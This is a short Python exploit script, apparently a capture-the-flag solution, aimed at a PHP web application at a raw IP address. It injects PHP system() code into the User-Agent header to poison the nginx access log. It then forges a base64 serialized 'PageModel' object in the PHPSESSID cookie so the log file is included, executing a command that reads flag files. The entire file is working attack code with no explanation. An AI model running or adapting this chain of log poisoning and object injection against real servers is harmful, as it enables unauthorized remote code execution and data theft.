import requests
import base64

url="http://138.68.182.108:31246"

#filestr='/www/index.html';
filestr='/var/log/nginx/access.log'
cmd = 'cat ../flag_*'
headers = {"User-Agent": "<?=system(\'{}\'); ?>".format(cmd)}

s = requests.Session()
r = s.get(url,headers=headers)
#print(r.text)
#print("\n\nCookies:\n")
for i in s.cookies:
#    print("{}: {}".format(i.name,i.value))
#    print("Base64 decoded: {}".format(base64.b64decode(i.value)))
    if(i.name=="PHPSESSID"): 
        i.value = base64.b64encode('O:9:"PageModel":1:{s:4:"file";s:'+ str(len(filestr)) + ':"'+filestr+'";}')
r = s.get(url,headers=headers)
print(r.text)